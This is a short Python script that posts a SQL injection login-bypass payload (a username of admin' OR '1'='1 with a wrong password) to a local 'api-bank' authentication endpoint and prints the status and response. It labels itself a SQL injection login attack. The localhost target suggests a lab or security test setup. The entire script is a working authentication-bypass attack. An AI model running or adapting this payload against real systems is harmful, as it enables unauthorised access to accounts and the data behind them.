import requests
import json

url = "http://localhost:30080/api-bank/api/auth/login"
headers = {
    "Content-Type": "application/json"
}
payload = {
    "username": "admin' OR '1'='1",
    "password": "wrongpassword"
}

print("Triggering SQL Injection login attack...")
try:
    resp = requests.post(url, json=payload, headers=headers, timeout=10)
    print(f"Status Code: {resp.status_code}")
    print(f"Response: {resp.text}")
except Exception as e:
    print(f"Error: {e}")
